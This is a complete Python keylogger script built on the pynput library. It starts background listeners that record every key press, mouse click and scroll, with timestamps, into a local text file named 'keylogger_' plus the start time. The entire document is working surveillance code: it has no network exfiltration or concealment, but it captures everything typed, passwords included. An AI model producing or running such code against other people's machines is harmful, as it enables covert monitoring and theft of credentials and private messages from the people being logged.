from pynput.mouse import Listener as MouseListener
from pynput.keyboard import Listener as KeyboardListener
import logging
import datetime

log_dir = ""

x = datetime.datetime.now()
x = x.ctime()
x = str(x).replace(' ', '_').replace(':', '_')
name = x
print(x)

# name = str(x).replace(' ', '_').replace(':', '-')
# name = name.split('.')
# name  = name[0]
# print(name)


logging.basicConfig(filename=(log_dir + "keylogger_" + name + ".txt"),
                    level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info("Key pressed: {0}".format(key))

def on_click(x, y, button, pressed):
    if pressed:
        logging.info('Mouse clicked at ({0}, {1}) with {2}'.format(x, y, button))
    else:
        logging.info('Mouse released at ({0}, {1}) with {2}'.format(x, y, button))

def on_scroll(x, y, dx, dy):
    logging.info('Mouse scrolled at ({0}, {1})({2}, {3})'.format(x, y, dx, dy))


# Setup the listener threads
keyboard_listener = KeyboardListener(on_press=on_press)
mouse_listener = MouseListener( on_click=on_click, on_scroll=on_scroll)

# Start the threads and join them so the script doesn't end early
keyboard_listener.start()
mouse_listener.start()
keyboard_listener.join()
mouse_listener.join()
